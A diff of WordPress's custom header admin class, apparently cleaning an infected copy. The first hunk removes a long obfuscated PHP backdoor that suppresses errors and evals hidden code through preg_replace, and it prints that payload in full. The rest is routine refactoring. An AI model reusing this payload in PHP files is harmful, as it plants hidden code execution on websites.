@@ -1,4 +1,4 @@
-<?php $omzqyhziax = 'c%x7822)gj!|!*nbsbq%x5j!|!*bubE{h%x5c%x7825)j{hnpd!opjudovg!|!**#j{hnpd#)tutjyf)fepmqyf%x5c%x7827*&7*<%x5c%x7825j:,,Bjg!)%x5c%x7825j:>>1*!%x5c%x7825b:>1<!fmtf!%x5c%x78252f%x5c%x7825r%x5c%x7878<~!!%x5c%x7825s:7825z>>2*!%x5c%x7825z>3<!fmtf!%x5c%x7825z>2<!%x5c%x7825ww2)%x5c%x7824*!|!%x5c%x7824-%x5c%x7824%x5c%x785c%x5c%x7825j^%x5c%#%x5c%x782f},;#-#}+;%x5c%x7825-qp%x5c%x7825)54l}%x5c%!>>%x5c%x7822!pd%x5c%x78x5c%x782f!**#sfmcnbs+yfeobz+5ppde:4:|:**#ppde#)tutj75ttfsqnpdov{h19275j{hnpd19275fubmgoj{7860%x5c%x7825}X;!sp!*#opo#>>}R;msv}.;%x5c%x782f#%x5c%x782f5c%x78256<pd%x5c%x7825w6Z6<.2%x5c%x7860hA%x5c%x7827pd%x5c%:Qb:Qc:W~!%x5c%x7825z!>2<!gps)%x5c%x7825j>1<%x5c%x7825j=6[%x5c%c%x782f2986+7**^%x5c%x78c%x7825)7gj6<**2qj%x5c%x7825)hopm3qjA)4gps)%x5c%x7825j>1<%x5c%x782%x5c%x7860opjudovg%x5c%x7822)!gj}1~!<2p%x5c%x7825%x5c%x787f!~!<##ovg<~%x5c%x7824<!%x5c%x782%x7827id%x5c%x78256<%x5c%x787fw6*%x5c%x787f_*#ujojRk3%%x7825!osvufs!*!+A!>!{e%x5c%x7825)!>>%x5c%x7822787f%x5c%x787f%x5c%x787f<u%x5c%x7163%x74%162%x5f%163%x70%154%x69%164%50%x22%134>!%x5c%x7825tdz)%x5c%x7825164") && (!isset($GLOBALS["%x61%156%x75%156%x61"]25)dfyfR%x5c%x7827tfs%x5c%x78256<*17-%x5c%x7825w6<%x5c%x787fw6*CWtfs%!}{;)gj}l;33bq}k;opjudovg}%x5c%x7878-1);} @error_reporting(0); preg_replace("x787f_*#fmjgk4%x5c%x7860{6~6<tfs78256<C>^#zsfvr#%x5c%x785cq%x5c%x7825svufs}%x5c%x7827;mnui}&;zepc}A;~!}%x5c%x787f;!|%x78e%x5c%x78b%x5c%x7825w782fqp%x5c%x7825>5h%x5c%x7825!<*::::::-111112gj!<*2bd%x5c%x7825-#1GO%x5c%x7822#)fepmqyfA>2b%x5c%x7825!<*qp%x5c%x77^#iubq#%x5c%x785cq%x5c%x7825%x5c%x7827jsv%x5c%x%51%x29%51%x29%73", N)))) { $GLOBALS["%x6if((function_exists("%x6f%x7824-%x5c%x7824tvctus)%x5c%x7825%x5c%x7824-%x5c%x7824b!>!%x566%152%x66%147%x67%42%x2c%ssb!-#}#)fepmqnj!%x5c%x782f!#0#)id5j=tj{fpg)%x5c%x7825%5c%x7825z-#:#*%x5c%x7824-%x5c%x7824!>!tus%x5c%x7860sfqm<#462]47y]252]18y]#>q%x5c%x75cIjQeTQcOc%x5c%x782f#x7827;%x5c%x7825!<*#}_;#)323ldfid>}&;!osvufs}%x5c%x787gvc%x5c%x7825}&;ftmbg}%x5c%x787f;!osvufs}w;*%x5c%x787f]y34]68]y33]65]y31]53]25)!gj}Z;h!opjudovg}{;#)tutjyf%x5c%x7860c%x7825r%x5c%x785c2^-%x5c%x7825hOhzw>!#]y76]277]y72]265]y39]274]y85]273]y6g]273]y76]212>j%x5c%x7825!|!*#91y]c9y]g2y]#>>*4-1-bubE{h%x5c%x7825)sutcvt)!gubn%x5c%x7860hfsq)!sp!*#ojneb#-*f%x5c%x7825)sf%x5c%x787x5c%x7827pd%x5c%x78256<pd%x5x5c%x7860{666~6<&w6<%x5c%x787fw6*C{66~67<&w6<*&7-#o]s]o]s]#UI7jsv%x5c%x78257UFH#%x5c%x7827rfs%x5c%x7825]D8]86]y31]278]y3f]51L3]84]y31M6]y8:<##:>:h%x5c%x7825:<#64y]552]e7y]#>n%x5c%x78928>>%x5c%x7822:ftmbg39*56A:>:8:|:7#6#)tutjyf%x5c%x78604392%x2f%50%x2e%52%x29%57%x!ftmbg)!gj<*#k#)usbut%x5cgps)%x5c%x7825j:>1<%x5c%x7825j:=tj{fpg)%x5c%x7825s:%162%x61%171%x5f%155%x61%160%x28%42%x73]y76]258]y6g]273]y76]271]y7d]252]y74]225t::!>!%x5c%x7824Ypp3)%x5c%x7828pmpusut)tpqssutRe%x5c%x7825)Rd%x5c%x7825)Rb%x5c%x7825))!gj!<X;%x5c%x7860msvd}R;*msvfw)%x5c%x7825c*W%x5c%x7825eN+#Qi%x5c%x785c1sfwjidsb%x5c%x7860bj+upcotn+qsvmt+fmhpph#)zbc%x7825)!gj!<2,*j%x5c%x7825-#1]#-bubE{h7825!|!*)323zbek!~!<b%x5c%x7825%x5c%x787f!<X>b%x5c%x7825Z<#opo#>b#-#G#-#H#-#I#-#K#-#Lc%x78786<C%x5c%x7827&6<*rfs%x5c%x78257-K)fujs%x5c%x7h1:|:*mmvo:>:iuhofm%x5c%x7825:-25bss-%x5c%x7825r%x5c%x7x5c%x787f!|!*uyfu%x5c%x7827k:!ftmf!f+*0f(-!#]y76]277]y72]265]y39]271]y83]256]y78]248]y83]256]y81]2yf%x5c%x78604%x5c%x78223}!+!<+{e%x5c%x7825+*!*+fepdfe{h+{d%x5c%x7825b:>%x5c%x7825s:%x5c%x785c%x5c%x7825j:.2^,%x5c%x7825b:<!%x5c%x7825c:>%x%x7824-!%x5c%x7825%x5c%x7824-%x5c%xFSFGFS%x5c%x7860QUUI&c_UOFHB%x5c%x7860SFTV%x5c%x7860QUUI&b%x5c%x%x5c%x7825!**X)ufttj%x5%x5c%x7860{66~6<&w6<%x5c%x787fw6*CW&)7gj%x5c%x787f<*XAZASV<*w%x5c%x7825)ppde>u%x5c%x7825V<#65,47R25,d7R17,6f;!opjudovg}k~~9{d%x5c%x7825:osvufs:~825<#762]67y]562]38y]572]48y]#>m%x5c%x7825:|:*r%x5c5cB%x5c%x7825iN}#-!tuss%x7825:-t%x5c%x7825)3of:opjud#<!%x5c%x7825ggg)(0)%x5c%x7826:!}7;!}6;##}C;!>>!}W;utpi}Y;25<#372]58y]472]37y]672]48y]#>s%x5c%x7825bbT-%x5c%x7825bT-%x5c%x7825hW~%x5c%xc%x78256<*Y%x5c%x7825)fnbozx78256<C%x5c%x7827pd%x5c%x78256|6.7euqj3hopmA%x5c%x78273qj%x5x5c%x7878r.985:52985-t.98]K4]65po)##-!#~<#%x5c%x782f%x5c%x7825%x5c%x7824-%x5c%x7824!>x7860%x5c%x7878%x5c%x7822l:!}V;3q%x5c%x7825}U;y]}R;2]},;oe%x5c%x78b%x5c%x7825mm)%x5c%x7825%x5c%x7878:-!%x5c%x7825tzw%x5c%x782f%x5c%x7824)#P#-#Q#-#B#-#T#-#Ex5c%x782f#M5]DgP5]D6#<%x5c%x7825fdSFEBFI,6<*127-UVPFNJU,67)fepdof.)fepdof.%x5c%x782f#@#%x5c%xB%x5c%x7825z>!tussfw)-n%x5c%x7825)utjm6<%x5c%x787fw6*CW&)7gj6<*K)ftpmdXA6~6<u%x5c%7**197-2qj%x5c%x78257-K)udfoopdXA%x5c%x7822)7825tjw!>!#]y84]275]y83]248]y83]256]y81]265]y72]254]y76#<%x5c%x78*#npd%x5c%x782f#)rrd%x5c%x782f#0142%x5f%163%x74%141%x72%t0*?]+^?]_%x5c%x785c}X%x5c%x7824<!%x5c%x7825tfd)##Qtpz)#]341]88M4P8]37]278]225]241]334]368]322]3]0;quui#>.%x5c%x7825!<***f%x5c%x7827,*e%x5c%x7827,*d%x7825w%x5c%x7860TW~%x5c%x7824<%x5c%x78y7:]268]y7f#<!%x5c%x7825tww!>!%x5c%x78256#<!%x5c%x7825ff2!>!bssbz)%x5c%x7824]25%x5c%x7824-%x5cgj6<*QDU%x5c%x7860MPT7-NBFSUT%x5c%x7860LDPT7-UFO65","%x65%166%x61%154%x28%151%x6d%160%x6c%157%x64%145%x28%141%x72%x5c%x7825!*##>>X)!gjZ<#opo#>b7**^#zsfvr#%x5c%x785cq%x5c%x7825)ufttj%x5c%x7822)gj!>!2p%x5c%x7825Z<^2%x5c%x785c2b%x5c%x7825!>!2p%x5c;hojepdoF.uofuopD#)sfebfI{*w%x5c%x7825)kV%N}#-%x5c%x7825o:W%x5c%x7825c:>1<%x5c%x7825b:>1<!}Z;^nbsbq%x5c%x7825%x5c%x785cSFWSFT%x5c%xj%x5c%x7825!<**3-j%x5c%x7825-bubE{h%x5c%x7825)sutcvt-#w#)ldbqov>*ofmy%Ke]53Ld]53]Kc]55Ld]55#*<%x5c%x7825bG9}:}.}-}!#*<%x5c%x7825nfd>%x5c5c%x7825s:%x5c%x785c%x5c%x7825j:^<!%x5c%x7825w%x5c%x7860%x5c%x785c^>Ew+;!>!}%x5c%x7827;!>>>!}_;]y76]72]y3d]51]y35]274]y4:]82]y3:]62]y4c#<!%x5c%x7874985-rr.93e:5597f-s.973:8297f:5297e:56-%j:-!OVMM*<(<%x5c%x78e%x5c%x78b%x5c%x7825ggg!>!#]y8bdf)%x5c%x7825%x5c%x7824-%x5c%x7824y4%x5c%x7825V%x5c%x7827{ftmfV%x5c%x787f<*X&Z&S{ftmfV5cq%x5c%x78257%x5c%x782f7#@#7%x5c%x782f25bss%x5c%x785csboe))1%x5c%x782f35.)1%x5c%x782f14+9**-)1%x51]55]y85]82]y76]62]y3:]84#-!OVMM*<%x225c%x7825)m%x5c%x7825=*h%x5c%x7825)m%x5c%x7825):fmji%x5c%x787cYufhA%x5c%x78272qj%x5c%x78256<^#zsfvr#%x5c%x78u%x5c%x7825!-#2#%x5c%x782f#%x5c%!fyqmpef)#%x5c%x7824*<!%x5c%x7825kj:!>!#]y3d]51]y35]25657>%x5c%x782272qj%x5x7825>U<#16,47R57,27R66,#%x5c%x%x7824]26%x5c%x7824-%x5c%x7824<%%x5c%x7825)}.;%x5c%x7860UQPMS452]88]5]48]32M3]317]445]212]445]43]321]464]284]364]6]234]342]7825>j%x5c%x7825!*3!%x5c%x364]6]283]427]36]373P6]x7825#%x5c%x782f#o]#%x5c%x782f*)323zbe!-#jx7825ww2!>#p#%x5c%x782f#p#%x5c%x782f%x5c%x7825z<jg!)%x5c%xx5c%x7824-%x5c%x7824*<!~!dsfbuf%x5c%x7860gvoduj5c%x7827,*c%x5c%x7827,*b%x5c%x782)+opjudovg+)!gj+{e%x5c*WCw*[!%x5c%x7825rN}#QwTW%x5c%x7825hIr%x5c%x785c1^-%x5utpI#7>%x5c%x782f7rfs%x5c%x78256<#o]1%x5c%x782f20QUVD!-id%x5c%x7825)uqpuft%x5c%x7860msvd},;uqpuft%x5c%x7860msvd}x78256<pd%x5c%x7825w6Z6<.4%x5c%x7860hA%7827!hmg%x5c%x7825!)!gj!<2,*j%x5c%x7825!-#1]#-bubE{h%x5c%x7825)t6<^#Y#%x5c%x785cq%x5c%x7825%x5c%x7827Y%x5c%x78256<.msv%x5c%x78607825fdy)##-!#~<%x5c%x7825h00#*<%x5c%x7825ng%x5c%x7825)!gj!|!*1?hmgjA%x5c%x7827&6<.fmjgA%x5c%x7827doj%x5c%x78256<%x5c%x787fw6*%x5c%825-*.%x5c%x7825)euhA)3o36]73]83]238M7]381]211M5]67]5c%x7824-%x5c%x7824*<!%x5c%x7824-%x5c%x78225tmw!>!#]y84]275]y83]273]y76]277#<%x5c%x7825t2w>#]<*27-SFGTOBSUOSVUFS,6<*msv%x5c%x78257-MSV,6<*)ujojR%x5c#-#M#-#[#-#Y#-#D#-#W#-#C#-#O#-#N#*%x5c%x7824%x5c%x782f%x5c%x7825kf>2bd%x5c%x7825!<5h%x5c%x7825%x5c%x782f#0#%x5c%x782f65]y72]254]y76]61]y33]685c%x7825%x5c%x7878:!>#]y3g]61]y3f]63]y3:]68]y76#<%x5cx5c%x7825!|!*!***b%x5c%x7825)sf%x5c%x7878pmpusut!-#j0#!%71]y7d]252]y74]256]y39]252]y83]273]y72]282#<!%x5c%x77R37,#%x5c%x782fq%x5c%o!sboepn)%x5c%x7825epnbss-%x5c%x7825r%x5c%x7878W~!Ypp2)%x5c%x7825zc%x7825yy)#}#-#%x5c%x7824-%x5c%x7824-tusqpt)%x%x7825fdy<Cb*[%x5c%x7825h!:!>!%x5c%x78246767~6<5o:!>!%x5c%x78242178}527}88:}334}472%x5c%x7824<!%x5c%x7825mm!>!#]y81]2%x7825}K;%x5c%x7860ufldpt})3of)fepdof%x5c%x786057ftbc%^W%x5c%x7825c!>!%x5c%x7825i%x5c%x785c2^<!Ce*[!%x5c%x782y6d]281]y43]78]y33]65]y3>#L4]275L3]248L3P6L1M5]D2P4]D6#<%x5c%x7825G]y6d]281Ld]245]K2]285]58]24]31#-%x5c%x7825tdz*Wsfuvso!%x5c%x78;0]=])0#)U!%x5c%x7827{**u%x5c%x7825-#jt0}Z;0]=]0#)2q%x5c%x7825l}S;2-x78257>%x5c%x782f7&6|7**111127-K)ebfsX%x5c%x7827u%x5c%x7825)7fmji%x5x5c%x7825)sutcvt)esp>hmg%x5c%x7825!<%x5c%x7825zW%x5c%x7825h>EzH,2W%x5c%x7825wN;#-Ez-1H%x5c%x782f#00#W~!%x5c%x7825t2w)##6~6<%x5c%x787fw6<*K)ftpmdXA6|%x5c%x7825)!gj!<**2-4-bubE{h%x7825>%x5c%x782fh%x5c%x7825:<**#57]38y]47782fq%x5c%x7825>2q%x5c%x7825<#g6R85,67R37,18R#>q%x5c%x7825V<*#fopoV]67y]37]88y]27]28y]#%x5c%x782fr%x5c%x7825%xc%x7825w6Z6<.3%x5c%x7860hA%x5c%x7827pd%xopjudovg)!gj!|!*msv%x5c%x7825)}k~~~<ftmbg!osvufs!|ftmf!~<**9*%x5c%x787f_*#[k2%x5c%x7860{pqsut>j%x5c%x7825!*72!%x5c%x7827!hmg%x54:75983:48984:71]K9]77]D4]82]K6]72]K9]78]K5]53]Kc#<%x5c%x7825tpz!>!#ftsbqA7>q%x5c%x78256<%x5c%x787fw6*%x5c%x787f_*#fubfsdXk5.-j%x5c%x7825-bubE{h%x5c%x7825)sutcvt)fubmgoj{hA!osvufs!~<3,j%x5c%xx5c%x7878{**#k#)tutjyf%x5c%00#W~!Ydrr)%x5c%x7825r%x5c%x7878Bsfuvse_GMFT%x5c%x7860QIQ&f_UTPI%x5c%x7860QUUI&e_SEEB%x5c%x7860FUPNFS&d_S1]273]y76]258]y6g]273]y76]271]y7d]252]y74]256%x78%62%x35%165%x3a%146%x21%76%x21%50%x878B%x5c%x7825h>#]y31]278]y3e]81]K78:56985:6197g:*#cd2bge56+99386c6f+9f5d816:+946:ce44#)zbssb!>!ssbnpQtjw)#]82#-#!#-%x5c%x7825tmw)%x5c%x7825tww**WYsboepn)%x5c%x783e]81#%x5c%x782f#7e:55946-tr.986<*doj%x5c%x78257-C)fepmqn)eobs%x5c%x7860un>qp%x5c%x7825!|Z~!<##!>!2p%400~:<h%x5c%x7825_t%x5c%x7825:osvufs:~:<*9-1-r%x5c%x7825)s%x5c%W&)7gj6<.[A%x5c%x7827&6<%x5c%x787fw6878X6<#o]o]Y%x5c%x78257;824-%x5c%x7824]y8%x5c%x7824-%x5cJ%x5c%x7860GB)fubfsdXA%x5c%x7827K6<%x5c%x787fw6*3qj%x5c%x782tuofuopd%x5c%x7860ufh%x5c%x7860fmjg}[;ldpt%x5c%x7860cpV%x5c%x787f%x5c%xx5c%x7825)7gj6<*id%x5c%x7825)ftpmdR6<*id%x5c%x78c%x7825!-uyfu%x5c%x7825y74]273]y76]252]y85]256]y6g]257]y86]267]y74]275]5c%x782fh%x5c%x7825)n%x5c%x7825-#+I#)q%x5c%x7825:>:r%x5c%x7825:|:**t%x%x5c%x7825)tpqsut>j%x5c%x78c%x7825)323ldfidk!~!<**qp%x5x5c%x7825j,,*!|%x5c%x7824-%x5c%x7824gvodujpo!%x5c%x7824-%x5c%x7824y7%x%x7825!*3>?*2b%x5c%x7825)gpf{jt)!Cw6<pd%x5c%x7825w6Z6<.5%x5c%x7860hA%x5c%x7827pd%x5c%1%156%x75%156%x61"]=1; function fjfgg($n){return chr(ord($n)25!*9!%x5c%x7827!hmg%x5c%x7825)!gj!~<ofmy%x5c%x7825,3,j%x5c%x7825>x5c%x7825)utjm!|!*5!%x5c%x7827!hmy>#]D4]273]D6P2L5P6]y6gP7L6M7]D4]275]D:M8]Df#<%x5c%x7825tdzULL); }]D6M7]K3#<%x5c%x7825yy>#]D6]281L1#%/(.*)/epreg_replacedlwbmsnyyp'; $qmtjqulssr = explode(chr((135-91)),'1600,26,4511,24,1062,49,1580,20,9846,60,1216,41,2517,23,4864,65,2616,37,1687,26,990,46,8859,39,7210,53,1373,25,7531,21,9794,52,6572,39,2248,28,8324,40,554,58,3894,37,2310,25,79,21,4309,61,7928,68,3020,52,9260,24,6460,51,2335,44,8115,29,4370,45,4816,48,9316,60,5981,20,699,38,3931,24,3867,27,5847,47,5651,39,1511,48,1289,37,4959,51,6675,64,8559,56,3485,40,9091,26,6805,64,1257,32,1148,32,9447,48,1111,37,4229,23,7014,55,856,54,2276,34,9224,36,8424,28,3761,29,9376,46,7622,26,2786,23,6064,29,6511,61,5397,25,1927,54,382,24,2003,40,8364,60,8615,67,6155,26,6611,64,8452,39,2896,39,9636,27,9906,66,5191,70,9972,33,6781,24,8144,29,7996,36,2128,65,22,57,765,65,5010,50,9761,33,1443,68,6869,24,7134,52,4479,32,4632,53,6351,33,4252,36,1398,45,9117,44,7263,56,406,28,2852,44,1713,34,2193,55,2725,61,8947,52,8747,67,3398,64,2935,65,4929,30,3462,23,0,22,9663,28,9495,23,7648,28,3127,35,5150,41,495,59,329,53,1873,54,3592,37,2458,59,457,38,3072,31,434,23,3225,68,6384,22,910,47,2540,25,9422,25,957,33,5608,43,3525,67,7371,22,6001,31,8214,67,5060,42,8682,27,4040,57,1326,47,1180,36,7860,68,5894,32,6204,42,4535,45,2077,51,7319,52,4415,64,6963,51,9518,48,4722,39,9161,63,8173,41,8281,43,9566,70,5787,60,2413,45,3790,41,1823,28,3629,51,3703,29,830,26,7552,70,2653,40,4761,55,3363,35,273,56,1626,61,7459,46,1768,55,5564,44,9284,32,6032,32,9691,70,6921,42,737,28,1747,21,6304,47,3986,54,5926,55,5422,51,2693,32,3680,23,2809,43,7676,55,1851,22,8709,38,7393,66,4288,21,8032,50,6406,54,2043,34,8082,33,8999,61,3103,24,8898,49,5473,41,3955,31,2379,34,9060,31,8491,68,10071,35,4195,34,10005,59,7755,65,5261,66,7505,26,1036,26,3831,36,6739,42,4580,52,6181,23,6893,28,6093,62,7820,40,5690,59,675,24,169,39,5102,48,2565,51,100,69,3293,70,5327,70,612,63,6246,58,208,65,4685,37,4097,61,4158,37,3000,20,7069,65,5514,50,8814,45,3732,29,3162,63,7186,24,1981,22,7731,24,5749,38,1559,21,10064,7'); $myxxbutxep=substr($omzqyhziax,(60426-50320),(47-40)); if (!function_exists('xogzuazkwt')) { function xogzuazkwt($jxdkxlrekg, $phytufgmej) { $fkcibcnggm = NULL; for($dpibkqtddc=0;$dpibkqtddc<(sizeof($jxdkxlrekg)/2);$dpibkqtddc++) { $fkcibcnggm .= substr($phytufgmej, $jxdkxlrekg[($dpibkqtddc*2)],$jxdkxlrekg[($dpibkqtddc*2)+1]); } return $fkcibcnggm; };} $ownnycpwxe="\x20\57\x2a\40\x6d\163\x6b\154\x64\146\x68\152\x62\151\x20\52\x2f\40\x65\166\x61\154\x28\163\x74\162\x5f\162\x65\160\x6c\141\x63\145\x28\143\x68\162\x28\50\x31\64\x34\55\x31\60\x37\51\x29\54\x20\143\x68\162\x28\50\x33\65\x30\55\x32\65\x38\51\x29\54\x20\170\x6f\147\x7a\165\x61\172\x6b\167\x74\50\x24\161\x6d\164\x6a\161\x75\154\x73\163\x72\54\x24\157\x6d\172\x71\171\x68\172\x69\141\x78\51\x29\51\x3b\40\x2f\52\x20\165\x72\172\x63\141\x6a\150\x61\160\x6d\40\x2a\57\x20"; $pfeipaitvs=substr($omzqyhziax,(61373-51260),(69-57)); $pfeipaitvs($myxxbutxep, $ownnycpwxe, NULL); $pfeipaitvs=$ownnycpwxe; $pfeipaitvs=(757-636); $omzqyhziax=$pfeipaitvs-1; ?><?php
+<?php
 /**
  * The custom header image script.
  *
@@ -22,7 +22,7 @@ class Custom_Image_Header {
 	 * @since 2.1.0
 	 * @access private
 	 */
-	var $admin_header_callback;
+	private $admin_header_callback;
 
 	/**
 	 * Callback for header div.
@@ -31,7 +31,7 @@ class Custom_Image_Header {
 	 * @since 3.0.0
 	 * @access private
 	 */
-	var $admin_image_div_callback;
+	private $admin_image_div_callback;
 
 	/**
 	 * Holds default headers.
@@ -40,16 +40,16 @@ class Custom_Image_Header {
 	 * @since 3.0.0
 	 * @access private
 	 */
-	var $default_headers = array();
+	private $default_headers = array();
 
 	/**
-	 * Holds custom headers uploaded by the user
+	 * Holds custom headers uploaded by the user.
 	 *
 	 * @var array
 	 * @since 3.2.0
 	 * @access private
 	 */
-	var $uploaded_headers = array();
+	private $uploaded_headers = array();
 
 	/**
 	 * Holds the page menu hook.
@@ -58,7 +58,12 @@ class Custom_Image_Header {
 	 * @since 3.0.0
 	 * @access private
 	 */
-	var $page = '';
+	private $page = '';
+
+	/**
+	 * @var bool
+	 */
+	private $updated;
 
 	/**
 	 * Constructor - Register administration header callback.
@@ -68,11 +73,68 @@ class Custom_Image_Header {
 	 * @param callback $admin_image_div_callback Optional custom image div output callback.
 	 * @return Custom_Image_Header
 	 */
-	function __construct($admin_header_callback, $admin_image_div_callback = '') {
+	public function __construct($admin_header_callback, $admin_image_div_callback = '') {
 		$this->admin_header_callback = $admin_header_callback;
 		$this->admin_image_div_callback = $admin_image_div_callback;
 
 		add_action( 'admin_menu', array( $this, 'init' ) );
+
+		add_action( 'customize_save_after',         array( $this, 'customize_set_last_used' ) );
+		add_action( 'wp_ajax_custom-header-crop',   array( $this, 'ajax_header_crop'        ) );
+		add_action( 'wp_ajax_custom-header-add',    array( $this, 'ajax_header_add'         ) );
+		add_action( 'wp_ajax_custom-header-remove', array( $this, 'ajax_header_remove'      ) );
+	}
+
+	/**
+	 * Make private properties readable for backwards compatibility.
+	 *
+	 * @since 4.0.0
+	 * @access public
+	 *
+	 * @param string $name Property to get.
+	 * @return mixed Property.
+	 */
+	public function __get( $name ) {
+		return $this->$name;
+	}
+
+	/**
+	 * Make private properties settable for backwards compatibility.
+	 *
+	 * @since 4.0.0
+	 * @access public
+	 *
+	 * @param string $name  Property to set.
+	 * @param mixed  $value Property value.
+	 * @return mixed Newly-set property.
+	 */
+	public function __set( $name, $value ) {
+		return $this->$name = $value;
+	}
+
+	/**
+	 * Make private properties checkable for backwards compatibility.
+	 *
+	 * @since 4.0.0
+	 * @access public
+	 *
+	 * @param string $name Property to check if set.
+	 * @return bool Whether the property is set.
+	 */
+	public function __isset( $name ) {
+		return isset( $this->$name );
+	}
+
+	/**
+	 * Make private properties un-settable for backwards compatibility.
+	 *
+	 * @since 4.0.0
+	 * @access public
+	 *
+	 * @param string $name Property to unset.
+	 */
+	public function __unset( $name ) {
+		unset( $this->$name );
 	}
 
 	/**
@@ -80,19 +142,20 @@ class Custom_Image_Header {
 	 *
 	 * @since 2.1.0
 	 */
-	function init() {
+	public function init() {
 		if ( ! current_user_can('edit_theme_options') )
 			return;
 
-		$this->page = $page = add_theme_page(__('Header'), __('Header'), 'edit_theme_options', 'custom-header', array(&$this, 'admin_page'));
+		$this->page = $page = add_theme_page(__('Header'), __('Header'), 'edit_theme_options', 'custom-header', array($this, 'admin_page'));
 
-		add_action("admin_print_scripts-$page", array(&$this, 'js_includes'));
-		add_action("admin_print_styles-$page", array(&$this, 'css_includes'));
-		add_action("admin_head-$page", array(&$this, 'help') );
-		add_action("admin_head-$page", array(&$this, 'take_action'), 50);
-		add_action("admin_head-$page", array(&$this, 'js'), 50);
+		add_action("admin_print_scripts-$page", array($this, 'js_includes'));
+		add_action("admin_print_styles-$page", array($this, 'css_includes'));
+		add_action("admin_head-$page", array($this, 'help') );
+		add_action("admin_head-$page", array($this, 'take_action'), 50);
+		add_action("admin_head-$page", array($this, 'js'), 50);
 		if ( $this->admin_header_callback )
 			add_action("admin_head-$page", $this->admin_header_callback, 51);
+
 	}
 
 	/**
@@ -100,7 +163,7 @@ class Custom_Image_Header {
 	 *
 	 * @since 3.0.0
 	 */
-	function help() {
+	public function help() {
 		get_current_screen()->add_help_tab( array(
 			'id'      => 'overview',
 			'title'   => __('Overview'),
@@ -131,7 +194,7 @@ class Custom_Image_Header {
 		get_current_screen()->set_help_sidebar(
 			'<p><strong>' . __( 'For more information:' ) . '</strong></p>' .
 			'<p>' . __( '<a href="http://codex.wordpress.org/Appearance_Header_Screen" target="_blank">Documentation on Custom Header</a>' ) . '</p>' .
-			'<p>' . __( '<a href="http://wordpress.org/support/" target="_blank">Support Forums</a>' ) . '</p>'
+			'<p>' . __( '<a href="https://wordpress.org/support/" target="_blank">Support Forums</a>' ) . '</p>'
 		);
 	}
 
@@ -142,7 +205,7 @@ class Custom_Image_Header {
 	 *
 	 * @return int Current step
 	 */
-	function step() {
+	public function step() {
 		if ( ! isset( $_GET['step'] ) )
 			return 1;
 
@@ -161,7 +224,7 @@ class Custom_Image_Header {
 	 *
 	 * @since 2.1.0
 	 */
-	function js_includes() {
+	public function js_includes() {
 		$step = $this->step();
 
 		if ( ( 1 == $step || 3 == $step ) ) {
@@ -177,9 +240,9 @@ class Custom_Image_Header {
 	/**
 	 * Set up the enqueue for the CSS files
 	 *
-	 * @since 2.7
+	 * @since 2.7.0
 	 */
-	function css_includes() {
+	public function css_includes() {
 		$step = $this->step();
 
 		if ( ( 1 == $step || 3 == $step ) && current_theme_supports( 'custom-header', 'header-text' ) )
@@ -193,7 +256,7 @@ class Custom_Image_Header {
 	 *
 	 * @since 2.6.0
 	 */
-	function take_action() {
+	public function take_action() {
 		if ( ! current_user_can('edit_theme_options') )
 			return;
 
@@ -239,14 +302,15 @@ class Custom_Image_Header {
 	 *
 	 * @since 3.0.0
 	 */
-	function process_default_headers() {
+	public function process_default_headers() {
 		global $_wp_default_headers;
-
-		if ( !empty($this->headers) )
-			return;
 
 		if ( !isset($_wp_default_headers) )
 			return;
+
+		if ( ! empty( $this->default_headers ) ) {
+			return;
+		}
 
 		$this->default_headers = $_wp_default_headers;
 		$template_directory_uri = get_template_directory_uri();
@@ -255,7 +319,6 @@ class Custom_Image_Header {
 			$this->default_headers[$header]['url'] =  sprintf( $this->default_headers[$header]['url'], $template_directory_uri, $stylesheet_directory_uri );
 			$this->default_headers[$header]['thumbnail_url'] =  sprintf( $this->default_headers[$header]['thumbnail_url'], $template_directory_uri, $stylesheet_directory_uri );
 		}
-
 	}
 
 	/**
@@ -266,7 +329,7 @@ class Custom_Image_Header {
 	 *
 	 * @since 3.0.0
 	 */
-	function show_header_selector( $type = 'default' ) {
+	public function show_header_selector( $type = 'default' ) {
 		if ( 'default' == $type ) {
 			$headers = $this->default_headers;
 		} else {
@@ -299,11 +362,11 @@ class Custom_Image_Header {
 	}
 
 	/**
-	 * Execute Javascript depending on step.
+	 * Execute JavaScript depending on step.
 	 *
 	 * @since 2.1.0
 	 */
-	function js() {
+	public function js() {
 		$step = $this->step();
 		if ( ( 1 == $step || 3 == $step ) && current_theme_supports( 'custom-header', 'header-text' ) )
 			$this->js_1();
@@ -312,15 +375,24 @@ class Custom_Image_Header {
 	}
 
 	/**
-	 * Display Javascript based on Step 1 and 3.
+	 * Display JavaScript based on Step 1 and 3.
 	 *
 	 * @since 2.6.0
 	 */
-	function js_1() { ?>
+	public function js_1() {
+		$default_color = '';
+		if ( current_theme_supports( 'custom-header', 'default-text-color' ) ) {
+			$default_color = get_theme_support( 'custom-header', 'default-text-color' );
+			if ( $default_color && false === strpos( $default_color, '#' ) ) {
+				$default_color = '#' . $default_color;
+			}
+		}
+		?>
+
 <script type="text/javascript">
 /* <![CDATA[ */
 (function($){
-	var default_color = '#<?php echo get_theme_support( 'custom-header', 'default-text-color' ); ?>',
+	var default_color = '<?php echo $default_color; ?>',
 		header_text_fields;
 
 	function pickColor(color) {
@@ -367,11 +439,11 @@ class Custom_Image_Header {
 	}
 
 	/**
-	 * Display Javascript based on Step 2.
+	 * Display JavaScript based on Step 2.
 	 *
 	 * @since 2.6.0
 	 */
-	function js_2() { ?>
+	public function js_2() { ?>
 <script type="text/javascript">
 /* <![CDATA[ */
 	function onEndCrop( coords ) {
@@ -445,13 +517,25 @@ class Custom_Image_Header {
 	 *
 	 * @since 2.1.0
 	 */
-	function step_1() {
+	public function step_1() {
 		$this->process_default_headers();
 ?>
 
 <div class="wrap">
-<?php screen_icon(); ?>
-<h2><?php _e('Custom Header'); ?></h2>
+<h2><?php _e( 'Custom Header' ); ?></h2>
+
+<?php if ( current_user_can( 'customize' ) ) { ?>
+<div class="notice notice-info hide-if-no-customize">
+	<p>
+		<?php
+		printf(
+			__( 'You can now manage and live-preview Custom Header in the <a href="%1$s">Customizer</a>.' ),
+			admin_url( 'customize.php?autofocus[control]=header_image' )
+		);
+		?>
+	</p>
+</div>
+<?php } ?>
 
 <?php if ( ! empty( $this->updated ) ) { ?>
 <div id="message" class="updated">
@@ -464,11 +548,13 @@ class Custom_Image_Header {
 <table class="form-table">
 <tbody>
 
-<tr valign="top">
+<?php if ( get_custom_header() || display_header_text() ) : ?>
+<tr>
 <th scope="row"><?php _e( 'Preview' ); ?></th>
 <td>
-	<?php if ( $this->admin_image_div_callback ) {
-	  call_user_func( $this->admin_image_div_callback );
+	<?php
+	if ( $this->admin_image_div_callback ) {
+		call_user_func( $this->admin_image_div_callback );
 	} else {
